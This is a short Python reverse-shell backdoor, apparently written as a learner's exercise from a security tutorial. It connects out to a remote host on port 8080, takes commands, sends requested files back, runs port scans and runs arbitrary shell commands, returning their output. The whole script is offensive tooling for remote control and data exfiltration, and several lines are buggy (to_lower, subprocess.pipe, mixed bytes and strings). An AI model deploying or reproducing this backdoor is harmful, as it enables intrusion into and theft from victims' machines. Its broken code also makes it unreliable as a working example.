#!/usr/bin/python3

import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        # someday when i'm gud i'm going to play with 1024 or even a good way to write this
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('Done')
        f.close()

    else:
        s.send('Unable to find the file')


def scanner(s, ip, ports):
    scan_result = ''
    for port in ports.split(','):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            output = sock.connect_ex((ip, int(port)))

            if output == 0:
                scan_result += "[+] Port " + port + " is open.\n"
            else:
                scan_result += "[-] Port " + port + " is closed or unreachable.\n"

            sock.close()

        except Exception as e:
            pass

    s.send(scan_result)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # I'm guessing the whole chapter before was setting this up to send to a central box, will need to refactor to run locally
    s.connect(('8.8.8.8', 8080))

    while True:
        #1024 again
        command = s.recv(1024)
        if 'terminate' in command.to_lower():
            s.close()
            break
        elif 'grab' in command.to_lower():
            grab,path = command.split('*')
            try:
                transfer(s, path)
            except Exception as e:
                s.send(str(e))
                pass
        elif 'scan' in command.to_lower():
            command = command[5:]
            ip,ports = command.split(':')
            scanner(s, ip, ports)
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.pipe)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()

main()
#done
